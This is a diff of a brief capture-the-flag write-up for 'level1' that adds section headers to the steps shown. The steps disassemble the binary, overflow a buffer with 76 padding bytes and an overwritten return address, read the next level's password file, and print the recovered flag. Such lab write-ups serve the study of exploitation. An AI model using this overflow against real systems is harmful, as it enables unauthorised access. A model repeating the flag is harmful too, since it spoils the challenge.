@@ -1,6 +1,12 @@
+# level1
+
+## disassemble
 objdump -d level1
-# 08048444 <run>
-python2.7 -c 'print("X"*76 + "\x44\x84\x04\x08")' > /tmp/exploit.txt
+
+## exploit
+python2.7 -c 'print("B"*76 + "\x44\x84\x04\x08")' > /tmp/exploit.txt
 cat /tmp/exploit.txt /dev/stdin | ./level1
+
+## flag
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
